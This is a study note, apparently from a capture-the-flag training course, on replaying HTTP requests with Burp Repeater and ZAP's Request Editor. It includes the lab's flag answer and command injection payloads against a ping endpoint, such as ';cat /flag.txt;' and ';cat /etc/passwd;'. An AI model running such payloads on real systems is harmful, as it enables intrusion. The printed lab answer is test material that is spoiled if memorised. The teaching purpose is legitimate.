# Section 7 — Repeating Requests

> Send a request to Repeater/Request Editor so you can replay and modify it without re-intercepting.
> Use case: running multiple commands against a vulnerable endpoint, testing different payloads.

---

## Lab Answer

| Question | Answer |
|----------|--------|
| Find the other flag using request repeating | `HTB{qu1ckly_r3p3471n6_r3qu3575}` |

**How:** The first flag was at `/var/www/html/flag.txt`. The second flag was at `/flag.txt` (root of filesystem).

```bash
# Quick way — curl as the repeater:
curl -s -X POST http://TARGET/ping -d "ip=;ls /;"        # list root filesystem
curl -s -X POST http://TARGET/ping -d "ip=;cat /flag.txt;" # read root flag
```

---

## What Request Repeating Is For

Manual interception = 5-6 steps per command (intercept → modify → forward → check browser → repeat). Repeater = modify + send + see response in 2 clicks. When testing a command injection, you'll run dozens of commands — Repeater is the right tool.

---

## Burp Repeater

```
1. Find the request in Proxy → HTTP History
2. Ctrl+R = send it to Repeater
3. Ctrl+Shift+R = switch to the Repeater tab
4. Modify the request body/headers/URL directly in the left pane
5. Click "Send"
6. Response appears in the right pane immediately — no browser needed
```

**Repeater workflow for command injection:**
```
Original:  ip=1
Round 1:   ip=;ls;         → see what files exist
Round 2:   ip=;ls /;       → look for flags at root
Round 3:   ip=;cat /flag.txt;   → read the flag
Round 4:   ip=;id;         → see what user we are
Round 5:   ip=;cat /etc/passwd; → system users
```

Each round = click Send, read response. No intercepting, no browser, no page load.

**Tip:** Right-click → Change Request Method to switch POST↔GET without rewriting headers.

**Tip:** Burp keeps both the original and edited request. Click the pane header → "Original Request" or "Edited Request" to compare.

---

## ZAP Request Editor

```
1. Find the request in History (bottom pane or History tab)
2. Right-click → "Open/Resend with Request Editor"
3. Edit the request in the editor window
4. Click "Send"
5. Response shows in the right pane
```

**Method dropdown** lets you switch HTTP methods (GET/POST/PUT/DELETE/etc.) without rewriting.

---

## ZAP HUD Replay

```
1. Find the request in the HUD's bottom History pane
2. Click on it → Request Editor appears
3. "Replay in Console" = response shown in the HUD window
4. "Replay in Browser" = response rendered in the browser (useful for seeing how the page reacts)
```

---

## HTTP History — Viewing Past Requests

Both tools log every request that passes through the proxy.

```
Burp:  Proxy → HTTP History
ZAP:   Bottom History pane (or History tab in main UI)
```

**What to look for in history:**
- POST requests with form data (login forms, search, actions)
- API calls to `/api/` endpoints
- Requests with tokens, session IDs, or user IDs in the body
- Any request where the server returns something interesting (200 with data, 302 redirect, etc.)
- WebSocket connections (separate tab) — async data fetching, often contains interesting data

---

## Exam Notes

- Repeater = the most-used Burp feature on the exam — know `Ctrl+R` (send to Repeater) and `Ctrl+Shift+R` (go to Repeater tab)
- Always check HTTP History before intercepting — the request you want may already be there
- When doing command injection enumeration, plan your commands: list files → find flag → read flag
- `find / -name "flag*" 2>/dev/null` is the fastest way to locate flags when you don't know the path
- ZAP's "Replay in Browser" is useful when you need to see the rendered output (images, forms, JS behavior)
- curl works as a repeater replacement for simple tests — faster to type than clicking through a GUI
